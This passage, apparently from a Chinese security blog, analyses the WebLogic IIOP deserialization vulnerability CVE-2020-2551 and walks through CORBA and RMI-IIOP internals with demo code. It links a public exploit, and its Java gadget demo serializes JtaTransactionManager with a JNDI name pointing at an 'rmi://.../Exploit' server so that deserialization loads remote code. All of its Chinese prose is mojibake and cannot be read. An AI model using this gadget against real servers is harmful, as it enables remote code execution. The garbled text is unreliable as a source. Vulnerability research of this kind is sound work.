Serviceçš„æµé‡å¦‚ä¸‹ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631941.jpg" alt="-w1584"><br>åœ¨è¿”å›çš„å“åº”ä¸­ï¼Œæ‹¿åˆ°äº†<code>RootPOA</code>ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631952.jpg" alt="-w824"><br>å¯¹åº”çš„ä»£ç ä¸ºï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631959.jpg" alt="-w1136"></p><p>æ¥ç€æ£€æµ‹è·å–åˆ°çš„<code>NamingService</code>å¯¹è±¡æ˜¯å¦ä¸º<code>NamingContextExt</code>ç±»çš„ç¤ºä¾‹ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631968.jpg" alt="-w1234"><br>å¯¹åº”ä»£ç ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631975.jpg" alt="-w1099"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631984.jpg" alt="-w1144"></p><p>æœ€åå‘é€<code>op=to_name</code>å’Œ<code>op=rebind</code>ä¸¤ä¸ªæŒ‡ä»¤ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631992.jpg" alt="-w1522"><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051631998.jpg" alt="-w778"><br>åˆ†åˆ«ä¸ºè®¾ç½®å¼•ç”¨åï¼Œå’Œè®¾ç½®ç»‘å®šä¿¡æ¯ï¼Œæ¥çœ‹ä¸€ä¸‹<code>op=rebind</code>çš„æ•°æ®åŒ…ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632008.jpg" alt="-w1280"><br>è¿™é‡Œé€šè¿‡IORä¿¡æ¯è¡¨ç¤ºäº†servant sideçš„ç›¸å…³rpcä¿¡æ¯ã€‚</p><h4 id="client-side"><a href="#client-side" class="headerlink" title="client side"></a>client side</h4><p>è¿™é‡Œä»¥NameServeræ–¹å¼ç”Ÿæˆstubä¸ºä¾‹ï¼š</p><ul><li>è·å–nameserviceã€<code>op=_is_a</code>åˆ¤æ–­</li><li>æ ¹æ®å¼•ç”¨åè·å–servant sideçš„æ¥å£Stub</li><li>å‘é€æ–¹æ³•åï¼Œè°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼Œå¾—åˆ°ç»“æœ<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632018.jpg" alt="-w1663"><br>åˆ†åˆ«å¯¹åº”ä»£ç æ­¥éª¤ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632026.jpg" alt="-w1132"></li></ul><h2 id="RMI-IIOP"><a href="#RMI-IIOP" class="headerlink" title="RMI-IIOP"></a>RMI-IIOP</h2><p>RMI-IIOPå‡ºç°ä»¥å‰ï¼Œåªæœ‰RMIå’ŒCORBAä¸¤ç§é€‰æ‹©æ¥è¿›è¡Œåˆ†å¸ƒå¼ç¨‹åºè®¾è®¡ï¼ŒäºŒè€…ä¹‹é—´ä¸èƒ½åä½œã€‚RMI-IIOPç»¼åˆäº†RMIå’ŒCORBAçš„ä¼˜ç‚¹ï¼Œå…‹æœäº†ä»–ä»¬çš„ç¼ºç‚¹ï¼Œä½¿å¾—ç¨‹åºå‘˜èƒ½æ›´æ–¹ä¾¿çš„ç¼–å†™åˆ†å¸ƒå¼ç¨‹åºè®¾è®¡ï¼Œå®ç°åˆ†å¸ƒå¼è®¡ç®—ã€‚<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632034.jpg" alt="-w925"></p><h3 id="Demo-RMI-IIOPè¿œç¨‹è°ƒç”¨"><a href="#Demo-RMI-IIOPè¿œç¨‹è°ƒç”¨" class="headerlink" title="Demo: RMI-IIOPè¿œç¨‹è°ƒç”¨"></a>Demo: RMI-IIOPè¿œç¨‹è°ƒç”¨</h3><p>å‚è€ƒæ–‡æ¡£<a href="https://docs.oracle.com/javase/8/docs/technotes/guides/rmi-iiop/tutorial.html#7738" target="_blank" rel="noopener">Tutorial: Getting Started Using RMI-IIOP</a>æ‰€è¿°ï¼Œä¸€å…±å››ä¸ªæ­¥éª¤ï¼Œå¯¹åº”çš„æ–‡ä»¶å¦‚ä¸‹ï¼š</p><ul><li>å®šä¹‰è¿œç¨‹æ¥å£ç±»ï¼šHelloInterface.java</li><li>ç¼–å†™å®ç°ç±»ï¼šHelloImpl.java, å®ç°æ¥å£HelloInterface</li><li>ç¼–å†™æœåŠ¡ç«¯ç±»ï¼šHelloServer.java, RMIæœåŠ¡ç«¯å®ä¾‹è¿œç¨‹ç±»ï¼Œå°†å…¶ç»‘å®šåˆ°name serviceä¸­</li><li>ç¼–å†™å®¢æˆ·ç«¯ç±»ï¼šHelloClient.java, è°ƒç”¨è¿œç¨‹æ–¹æ³•<code>sayHello()</code></li></ul><p>å®ç°æ¥å£ç±»ï¼Œå¿…é¡»è¦å®ç°Remoteè¿œç¨‹ç±»ï¼Œä¸”æŠ›å‡º<code>java.rmi.RemoteException</code>å¼‚å¸¸ã€‚<br>HelloInterface.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloInterface</span> <span class="keyword">extends</span> <span class="title">java</span>.<span class="title">rmi</span>.<span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">( String from )</span> <span class="keyword">throws</span> java.rmi.RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å®ç°æ¥å£ç±»ï¼Œå¿…é¡»å†™æ„é€ æ–¹æ³•è°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•ï¼Œç»™è¿œç¨‹å¯¹è±¡åˆå§‹åŒ–ä½¿ç”¨ï¼ŒåŒæ—¶è¦å®ç°ä¸€ä¸ªæ–¹æ³•ç»™è¿œç¨‹è°ƒç”¨ä½¿ç”¨(<code>sayHello()</code>)<br>HelloImpl.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.rmi.PortableRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">PortableRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();     <span class="comment">// invoke rmi linking and remote object initialization</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">( String from )</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>&#123;</span><br><span class="line">        System.out.println( <span class="string">"Hello from "</span> + from + <span class="string">"!!"</span> );</span><br><span class="line">        System.out.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç¼–å†™æœåŠ¡ç«¯ï¼Œåˆ›å»ºservantå®ä¾‹ï¼Œç»‘å®šå¯¹è±¡ã€‚<br>HelloServer.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloServer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> String JNDI_FACTORY = <span class="string">"com.sun.jndi.cosnaming.CNCtxFactory"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">//å®ä¾‹åŒ–Hello servant</span></span><br><span class="line">            HelloImpl helloRef = <span class="keyword">new</span> HelloImpl();</span><br><span class="line"></span><br><span class="line">            <span class="comment">//ä½¿ç”¨JNDIåœ¨å‘½åæœåŠ¡ä¸­å‘å¸ƒå¼•ç”¨</span></span><br><span class="line">            InitialContext initialContext = getInitialContext(<span class="string">"iiop://127.0.0.1:1050"</span>);</span><br><span class="line">            initialContext.rebind(<span class="string">"HelloService"</span>, helloRef);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">"Hello Server Ready..."</span>);</span><br><span class="line"></span><br><span class="line">            Thread.currentThread().join();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> InitialContext <span class="title">getInitialContext</span><span class="params">(String url)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);</span><br><span class="line">        env.put(Context.PROVIDER_URL, url);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ç¼–å†™å®¢æˆ·ç«¯ç±»ï¼Œè¿œç¨‹è°ƒç”¨<code>sayHello()</code>æ–¹æ³•ã€‚<br>HelloClient.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.rmi.PortableRemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">main</span><span class="params">( String args[] )</span> </span>&#123;</span><br><span class="line">        Context ic;</span><br><span class="line">        Object objref;</span><br><span class="line">        HelloInterface hi;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">            env.put(<span class="string">"java.naming.factory.initial"</span>, <span class="string">"com.sun.jndi.cosnaming.CNCtxFactory"</span>);</span><br><span class="line">            env.put(<span class="string">"java.naming.provider.url"</span>, <span class="string">"iiop://127.0.0.1:1050"</span>);</span><br><span class="line"></span><br><span class="line">            ic = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// STEP 1: Get the Object reference from the Name Service</span></span><br><span class="line">            <span class="comment">// using JNDI call.</span></span><br><span class="line">            objref = ic.lookup(<span class="string">"HelloService"</span>);</span><br><span class="line">            System.out.println(<span class="string">"Client: Obtained a ref. to Hello server."</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// STEP 2: Narrow the object reference to the concrete type and</span></span><br><span class="line">            <span class="comment">// invoke the method.</span></span><br><span class="line">            hi = (HelloInterface) PortableRemoteObject.narrow(</span><br><span class="line">                    objref, HelloInterface.class);</span><br><span class="line">            hi.sayHello( <span class="string">" MARS "</span> );</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span>( Exception e ) &#123;</span><br><span class="line">            System.err.println( <span class="string">"Exception "</span> + e + <span class="string">"Caught"</span> );</span><br><span class="line">            e.printStackTrace( );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>ç¼–è¯‘</strong><br>ç¼–è¯‘è¿œç¨‹æ¥å£å®ç°ç±»:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . -classpath . HelloImpl.java</span><br></pre></td></tr></table></figure></p><p>ç»™å®ç°ç±»åˆ›å»ºstubå’Œskeleton(ç®€å•ç†è§£å³jvmä¸­çš„å¥—æ¥å­—é€šä¿¡ç¨‹åº)ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmic -iiop HelloImpl</span><br></pre></td></tr></table></figure></p><p>æ‰§è¡Œå®Œåä¼šåˆ›å»ºä¸¤ä¸ªæ–‡ä»¶ï¼š</p><ul><li>_HelloInterface_Stub.classï¼š å®¢æˆ·ç«¯çš„stub</li><li>_HelloImpl_Tie.classï¼šæœåŠ¡ç«¯çš„skeleton<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632041.jpg" alt="-w377"></li></ul><p>ç¼–è¯‘ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -d . -classpath . HelloInterface.java HelloServer.java HelloClient.java</span><br></pre></td></tr></table></figure></p><p><strong>è¿è¡Œ</strong><br>å¼€å¯Naming Serviceï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1</span><br></pre></td></tr></table></figure></p><p>è¿è¡Œå®¢æˆ·ç«¯æœåŠ¡ç«¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java -classpath .  HelloServer</span><br><span class="line">java -classpath .  HelloClient</span><br></pre></td></tr></table></figure></p><blockquote><p>ä¸Šè¿°å®¢æˆ·ç«¯æœåŠ¡ç«¯ä»£ç å¦‚æœåœ¨<code>InitialContext</code>æ²¡ä¼ å…¥å‚æ•°å¯ä»¥åƒæ–‡æ¡£ä¸­æ‰€è¿°é€šè¿‡<code>java -D</code>ä¼ é€’<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632048.jpg" alt="-w756"></p></blockquote><p><strong>ç»“æœ</strong><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632055.jpg" alt="-w820"></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632063.jpg" alt="-w887"></p><h1 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h1><p>weblogic10.3.6ç‰ˆæœ¬ï¼Œjdk8u73ç‰ˆæœ¬</p><blockquote><p>é‡‡å‘ï¼Œè®°å¾—weblogicç‰ˆæœ¬ã€rmiæœåŠ¡ã€expç‰ˆæœ¬éƒ½ä¸€è‡´</p></blockquote><p>EXPï¼š<a href="https://github.com/Y4er/CVE-2020-2551" target="_blank" rel="noopener">https://github.com/Y4er/CVE-2020-2551</a><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632075.jpg" alt="-w1592"></p><h1 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h1><p>è¿™ä¸ªè¯¥æ¼æ´å€ŸåŠ©IIOPåè®®è§¦å‘ååºåˆ—åŒ–ï¼Œç»“åˆå¯¹<code>JtaTransactionManager</code>ç±»çš„é”™è¯¯è¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥ç»“åˆå…¶è§¦å‘å…¶ç±»çš„JNDIæ³¨å…¥é€ æˆRCEçš„æ•ˆæœã€‚</p><h2 id="JtaTransactionManager-Gadgetåˆ†æ"><a href="#JtaTransactionManager-Gadgetåˆ†æ" class="headerlink" title="JtaTransactionManager Gadgetåˆ†æ"></a>JtaTransactionManager Gadgetåˆ†æ</h2><p>weblogicä¸­è‡ªå¸¦çš„ä¸€ä¸ªSpringæ¡†æ¶çš„åŒ…ï¼š<code>/com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObject</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632083.jpg" alt="-w1177"><br>åœ¨ååºåˆ—åŒ–è°ƒç”¨<code>readObject</code>æ—¶ï¼Œä¼šè°ƒç”¨<code>initUserTransactionAndTransactionManager</code>æ–¹æ³•ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632091.jpg" alt="-w1181"><br>æ¥ç€è°ƒç”¨<code>this.lookupUserTransaction</code>æ–¹æ³•ï¼Œä¼ å…¥æˆå‘˜å˜é‡<code>this.userTransactionName</code>:<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632100.jpg" alt="-w1320"></p><p>è·å–<code>this.getJndiTemplate()</code>åï¼Œåœ¨<code>/com/bea/core/repackaged/springframework/jndi/JndiTemplate#lookup</code>ä¸­<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632108.jpg" alt="-w1285"><br>åˆ°è¿™é‡Œé€šè¿‡æ§åˆ¶<code>userTransactionName</code>å±æ€§ï¼Œè¿›è¡ŒJNDIæ³¨å…¥ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632117.jpg" alt="-w1428"></p><p>demo:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jnditest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = <span class="keyword">new</span> JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(<span class="string">"rmi://127.0.0.1:1099/Exploit"</span>);</span><br><span class="line">        serialize(jtaTransactionManager);</span><br><span class="line">        deserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize</span><span class="params">(Object obj)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"jndi.ser"</span>));</span><br><span class="line">            os.writeObject(obj);</span><br><span class="line">            os.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deserialize</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ObjectInputStream is = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"jndi.ser"</span>));</span><br><span class="line">            is.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632127.jpg" alt="-w1294"></p><p>åæ¥ç¿»äº†ä¸€ä¸‹èµ„æ–™ï¼Œåœ¨<a href="https://paper.seebug.org/718/" target="_blank" rel="noopener">CVE-2018-3191</a>ä¸­ä½¿ç”¨çš„å°±æ˜¯è¯¥gadgetï¼Œå½“æ—¶ç»“åˆT3åè®®è¿›è¡Œååºåˆ—åŒ–ï¼Œä¿®å¤æ–¹æ¡ˆå°†<code>JtaTransactionManager</code>çš„çˆ¶ç±»<code>AbstractPlatformTransactionManager</code>åŠ å…¥åˆ°é»‘åå•åˆ—è¡¨äº†ï¼ŒT3åè®®ä½¿ç”¨çš„æ˜¯<code>resolveClass</code>æ–¹æ³•å»è¿‡æ»¤çš„,<code>resolveClass</code>æ–¹æ³•æ˜¯ä¼šè¯»å–çˆ¶ç±»çš„,æ‰€ä»¥T3åè®®è¿™æ ·è¿‡æ»¤æ˜¯æ²¡é—®é¢˜çš„ã€‚ä½†æ˜¯åœ¨IIOPåè®®è¿™é‡Œï¼Œä¹Ÿæ˜¯ä½¿ç”¨é»‘åå•è¿›è¡Œè¿‡æ»¤ï¼Œä½†ä¸æ˜¯ä½¿ç”¨<code>resolveClass</code>æ–¹æ³•å»åˆ¤æ–­çš„ï¼Œè¿™æ ·é»˜è®¤åªä¼šåˆ¤æ–­æœ¬ç±»çš„ç±»åï¼Œè€ŒJtaTransactionManagerç±»æ˜¯ä¸åœ¨é»‘åå•åˆ—è¡¨é‡Œé¢çš„,å®ƒçš„çˆ¶ç±»æ‰åœ¨é»‘åå•åˆ—è¡¨é‡Œé¢,è¿™æ ·å°±å¯ä»¥ååºåˆ—åŒ–JtaTransactionManagerç±»äº†ï¼Œä»è€Œè§¦å‘JNDIæ³¨å…¥ã€‚</p><h2 id="Contextçš„ç”Ÿæˆä»¥åŠbindçš„æµç¨‹-servant-side"><a href="#Contextçš„ç”Ÿæˆä»¥åŠbindçš„æµç¨‹-servant-side" class="headerlink" title="Contextçš„ç”Ÿæˆä»¥åŠbindçš„æµç¨‹(servant side)"></a>Contextçš„ç”Ÿæˆä»¥åŠbindçš„æµç¨‹(servant side)</h2><p>åœ¨ä¸Šæ–‡ä¸­RMI-IIOPçš„å®¢æˆ·ç«¯demoä¸­ï¼Œåˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š</p><ul><li>ä»Name Serviceä¸­è·å–Conetextå¯¹è±¡</li><li>ä»Name Serviceä¸­æŸ¥è¯¢æŒ‡å®šåç§°æ‰€å¯¹åº”çš„å¼•ç”¨</li><li>è°ƒç”¨è¿œç¨‹æ–¹æ³•<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632141.jpg" alt="-w1081"></li></ul><p>å…ˆæ¥çœ‹ç¬¬ä¸€ä¸ªè¿‡ç¨‹ï¼Œæ— è®ºæ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯éƒ½è¦è¿›è¡Œçš„çš„ä¸€ä¸ªæ­¥éª¤ï¼š<code>InitialContext</code>æ–¹æ³•ä¸­å°†<code>env</code>å‚æ•°ä¼ å…¥ï¼Œè¿›è¡Œåˆå§‹åŒ–ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632149.jpg" alt="-w759"><br>ç»è¿‡å‡ æ¬¡è°ƒç”¨ï¼Œä¸€ç›´è·Ÿè¿›åˆ°<code>javax/naming/spi/NamingManager.java#getInitialContext</code>æ–¹æ³•<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632159.jpg" alt="-w778"><br>å¯ä»¥çœ‹åˆ°åœ¨è¿™é‡Œå°†æˆ‘ä»¬ä¼ å…¥çš„<code>env</code>å¯¹åº”çš„å·¥å‚ç±»è¿›è¡Œè·å–ï¼Œæˆ‘ä»¬æ¥æ‰¾ä¸€ä¸‹ï¼Œåœ¨weblogicä¸­æœ‰å¤šå°‘ä¸ªå¯ä»¥åŠ è½½çš„å·¥å‚ç±»ï¼Œæ‰¾åˆ°<code>InitialContextFactory</code>æ¥å£(<code>ctrl+h</code>æŸ¥çœ‹ä¾èµ–æ ‘)<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632168.jpg" alt="-w793"></p><p>è¿™é‡Œç›´æ¥æ¥çœ‹<code>WLInitialContextFactory</code>ç±»ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632175.jpg" alt="-w954"></p><p><code>/wlserver_10.3/server/lib/wls-api.jar!/weblogic/jndi/Environment#getContext</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632185.jpg" alt="-w1445"></p><p><code>getInitialContext</code>æ–¹æ³•ä¸­ï¼Œåˆ°è¿™é‡Œå…¶å®å°±æ˜¯CORBAçš„è§£ææµç¨‹äº†ï¼Œ<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632195.jpg" alt="-w1050"></p><p>ç®€å•è·Ÿä¸€ä¸‹<code>string_to_object</code>æ–¹æ³•ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯ä¸Šæ–‡ä¸­CORBAçš„stubç”Ÿæˆä¸‰ç§æ–¹å¼æ‰€å¯¹åº”çš„åè®®ï¼š</p><ul><li>IOR</li><li>Corbaname</li><li>Corbaloc<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632209.jpg" alt="-w1262"></li></ul><p>å†æ¥çœ‹<code>getORBReference</code>æ–¹æ³•ï¼Œå…¶å®å°±æ˜¯CORBAåˆå§‹åŒ–orbè·å–<code>Name Service</code>çš„è¿‡ç¨‹ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632218.jpg" alt="-w1246"><br>å¯¹åº”CORBAä¸­ä»£ç ï¼š<br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632226.jpg" alt="-w1001"><br>å†æ¥çœ‹ä¸€ä¸‹<code>Conetext</code>çš„ç»‘å®šè¿‡ç¨‹ï¼š<code>/corba/j2ee/naming/ContextImpl</code><br><img src="https://static-passer6y.d0g3.cn/0day/2020-03-19-15846051632236.jpg" alt="-w1065"><br>å¯ä»¥çœ‹åˆ°è¿™ä¸ªè¿‡ç¨‹å…¶å®å°±æ˜¯CORBAç”ŸæˆIORçš„è¿‡ç¨‹ï¼ŒæŒ‡å®šjavaç±»å‹äº¤äº’çš„çº¦å®šä¸º<code>tk_value</code>ï¼Œè®¾å®šopä¸º<code>rebind_any</code>ï¼Œå­˜å‚¨åºåˆ—åŒ–æ•°æ®åˆ°anyç±»ï¼Œå¾…client sideè°ƒç”¨ã€‚</p><blockquote><p>å…¶å®åœ¨åˆ†æè¿™é‡Œä¹‹å‰ä¸€ç›´æœ‰ä¸€ä¸ªé—®é¢˜æ— æ³•ç†è§£ï¼Œä¸€ç›´ä»¥ä¸ºweblogicæ˜¯orbd+servant sideï¼Œè€Œæˆ‘ä»¬å†™çš„expæ˜¯client sideï¼Œåœ¨å’Œ@Lucifaerå¸ˆå‚…å­¦ä¹ åï¼Œå…¶å®å¯¹äºweblogicçš„orbdè€Œè¨€ï¼Œservant sideå’Œclient 